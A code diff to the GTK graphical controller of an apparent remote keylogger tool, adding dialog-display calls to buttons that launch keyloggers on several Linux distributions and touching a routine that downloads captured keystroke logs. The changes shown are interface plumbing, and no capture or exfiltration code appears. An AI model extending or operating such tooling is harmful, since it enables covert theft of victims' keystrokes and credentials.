@@ -42,7 +42,8 @@ void cb_ubuntu16_run_the_keylogger(GtkButton *button, gpointer user_data)
     GtkWidget *launch_keylogger_dialog = NULL;
 
     launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Ubuntu 16.04 Keylogger ?");
-
+    
+    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
     {
         case GTK_RESPONSE_YES:
@@ -67,7 +68,8 @@ void cb_ubuntu18_run_the_keylogger(GtkButton *button, gpointer user_data)
     GtkWidget *launch_keylogger_dialog = NULL;
 
     launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Ubuntu 18 Keylogger ?");
-
+    
+    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
     {
         case GTK_RESPONSE_YES:
@@ -94,7 +96,8 @@ void cb_mint_run_the_keylogger(GtkButton *button, gpointer user_data)
     GtkWidget *launch_keylogger_dialog = NULL;
 
     launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Mint 19 Keylogger ?");
-
+    
+    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
     {
         case GTK_RESPONSE_YES:
@@ -119,7 +122,8 @@ void cb_debian_run_the_keylogger(GtkButton *button, gpointer user_data)
     GtkWidget *launch_keylogger_dialog = NULL;
 
     launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Debian 9 Keylogger ?");
-
+    
+    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
     {
         case GTK_RESPONSE_YES:
@@ -142,9 +146,10 @@ void cb_debian_run_the_keylogger(GtkButton *button, gpointer user_data)
 void cb_kali_run_the_keylogger(GtkButton *button, gpointer user_data)
 {
     GtkWidget *launch_keylogger_dialog = NULL;
-
+    
     launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Kali 2.0 Keylogger ?");
-
+    
+    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
     {
         case GTK_RESPONSE_YES:
@@ -169,7 +174,8 @@ void cb_fedora_run_the_keylogger(GtkButton *button, gpointer user_data)
     GtkWidget *launch_keylogger_dialog = NULL;
 
     launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Fedora 28 Keylogger ?");
-
+    
+    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
     {
         case GTK_RESPONSE_YES:
@@ -274,8 +280,6 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
 
         totalRcv += tailleBlockRecut;
 
-        //fputs(buffer, log_file);
-
     }while(totalRcv < data_len);
     
     printf("Log receive with success : %ld\n", totalRcv);
@@ -301,7 +305,7 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
  
     fclose(log_file);
 
-    /* Parametres inutilises */
+    /* Unused Parameters */
     (void)button;
     (void)user_data;
     
